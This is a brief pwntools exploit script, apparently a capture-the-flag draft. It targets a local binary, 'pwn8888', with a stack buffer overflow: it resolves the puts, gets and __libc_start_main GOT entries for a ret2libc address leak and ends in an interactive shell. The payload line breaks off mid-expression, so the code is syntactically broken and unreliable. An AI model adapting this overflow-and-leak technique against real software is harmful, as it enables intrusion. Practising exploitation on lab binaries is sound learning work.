from pwn import *

context.log_level = "debug"
context.terminal = ["qterminal", "-e"]

p = process("./pwn8888")
gdb.attach(p)
elf = ELF("./pwn8888")
libc = elf.libc
puts_plt = elf.plt["puts"]
#
puts_got = elf.got["puts"]
gets_got = elf.got["gets"]
libc_start_main_got = elf.got["__libc_start_main"]
payload = (
    b"a" * 0x18
    +
)
print("pid" + str(proc.pidof(p)))
pause()
p.sendline(payload)
# libc_re=(p.recv(16))
# print("is"+u64(libc888))
"""
libc_puts=u64(libc_re[:8])
libc_gets=u64(libc_re[8:])
print("libc_puts"+hex(libc_puts))
print("libc_gets"+hex(libc_gets))
"""
p.interactive()
